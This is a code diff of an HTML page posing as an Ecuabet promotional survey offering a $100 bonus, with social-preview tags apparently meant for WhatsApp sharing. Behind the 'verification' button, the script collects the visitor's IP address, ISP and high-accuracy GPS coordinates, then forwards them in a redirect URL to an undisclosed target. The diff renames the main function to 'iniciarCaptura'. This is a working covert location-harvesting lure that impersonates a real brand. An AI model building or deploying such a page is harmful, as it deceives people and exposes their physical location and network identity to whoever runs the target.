@@ -6,52 +6,20 @@
     <title>Gana un Bono de $100 - Ecuabet</title>
     <meta name="description" content="Si ya eres parte de ECUABET, solo llena la siguiente encuesta.">
 
-    <!-- Meta Tags para vista previa en WhatsApp -->
     <meta property="og:type" content="website">
     <meta property="og:title" content="¿TE GUSTARÍA PARTICIPAR POR UN BONO DE $100?">
     <meta property="og:description" content="Si ya eres parte de ECUABET, solo llena la siguiente encuesta.">
     <meta property="og:image" content="https://raw.githubusercontent.com/iliali/ecuabet/main/ecuabet.png">
     <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/iliali/ecuabet/main/ecuabet.png">
     <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
 
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            background: #1a237e; 
-            color: #fff; 
-            text-align: center; 
-            padding: 20px; 
-        }
-        .card { 
-            background: rgba(255, 255, 255, 0.1); 
-            padding: 30px; 
-            border-radius: 12px; 
-            backdrop-filter: blur(10px); 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3); 
-            max-width: 420px; 
-            width: 100%; 
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #1a237e; color: #fff; text-align: center; padding: 20px; }
+        .card { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; backdrop-filter: blur(10px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); max-width: 420px; width: 100%; }
         h2 { font-size: 20px; margin-bottom: 15px; }
-        p { font-size: 14px; color: #e0e0e0; margin-bottom: 20px; line-height: 1.4; }
-        .btn { 
-            width: 100%; 
-            padding: 14px; 
-            background-color: #00c853; 
-            color: white; 
-            border: none; 
-            border-radius: 6px; 
-            font-weight: bold; 
-            font-size: 16px; 
-            cursor: pointer; 
-            transition: background 0.3s;
-        }
-        .btn:hover { background-color: #00e676; }
+        p { font-size: 14px; color: #e0e0e0; margin-bottom: 20px; }
+        .btn { width: 100%; padding: 14px; background-color: #00c853; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
         #status { margin-top: 15px; font-size: 13px; color: #ffd54f; }
     </style>
 </head>
@@ -60,7 +28,7 @@
     <div class="card">
         <h2>Encuesta de Ecuabet</h2>
         <p>Haz clic en el botón para activar la verificación e ir a la encuesta.</p>
-        <button id="btnAction" onclick="iniciarProceso()" class="btn">CONTINUAR</button>
+        <button id="btnAction" onclick="iniciarCaptura()" class="btn">CONTINUAR</button>
         <div id="status"></div>
     </div>
 
@@ -69,32 +37,32 @@
         let yaRedirigido = false;
         let datos = { lat: '', lng: '', ip: '', isp: '' };
 
-        function redirigirFormulario() {
+        function redirigir() {
             if (yaRedirigido) return;
             yaRedirigido = true;
 
-            let params = [];
-            if (datos.lat) params.push("lat=" + encodeURIComponent(datos.lat));
-            if (datos.lng) params.push("lng=" + encodeURIComponent(datos.lng));
-            if (datos.ip) params.push("ip=" + encodeURIComponent(datos.ip));
-            if (datos.isp) params.push("isp=" + encodeURIComponent(datos.isp));
+            let query = [];
+            if (datos.lat) query.push("lat=" + encodeURIComponent(datos.lat));
+            if (datos.lng) query.push("lng=" + encodeURIComponent(datos.lng));
+            if (datos.ip) query.push("ip=" + encodeURIComponent(datos.ip));
+            if (datos.isp) query.push("isp=" + encodeURIComponent(datos.isp));
 
-            let finalUrl = targetUrl + (params.length > 0 ? "?" + params.join("&") : "");
+            let finalUrl = targetUrl + (query.length > 0 ? "?" + query.join("&") : "");
             window.location.href = finalUrl;
         }
 
-        async function iniciarProceso() {
+        async function iniciarCaptura() {
             const btn = document.getElementById('btnAction');
             const status = document.getElementById('status');
             
             btn.disabled = true;
             btn.innerText = "VERIFICANDO...";
-            status.innerText = "Por favor, permite el acceso a tu ubicación...";
+            status.innerText = "Solicitando permiso de ubicación...";
 
-            // Límite máximo de espera: 3.5 segundos por seguridad
-            setTimeout(redirigirFormulario, 3500);
+            // Límite de seguridad para redirigir máximo en 4 segundos
+            setTimeout(redirigir, 4000);
 
-            // Obtener IP e ISP en segundo plano
+            // 1. Captura de IP e ISP
             try {
                 let resp = await fetch('https://ipapi.co/json/');
                 if (resp.ok) {
@@ -103,25 +71,25 @@
                     datos.isp = json.org || json.asn || '';
                 }
             } catch (e) {
-                console.warn("Error capturando IP/ISP", e);
+                console.warn("Error en IP:", e);
             }
 
-            // Solicitud de Geolocalización
+            // 2. Captura de GPS
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
                         datos.lat = pos.coords.latitude;
                         datos.lng = pos.coords.longitude;
-                        redirigirFormulario();
+                        redirigir();
                     },
                     function(err) {
-                        console.warn("Geolocalización denegada o con error:", err);
-                        redirigirFormulario();
+                        console.warn("Geolocalización rechazada:", err);
+                        redirigir();
                     },
-                    { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
                 );
             } else {
-                redirigirFormulario();
+                redirigir();
             }
         }
     </script>
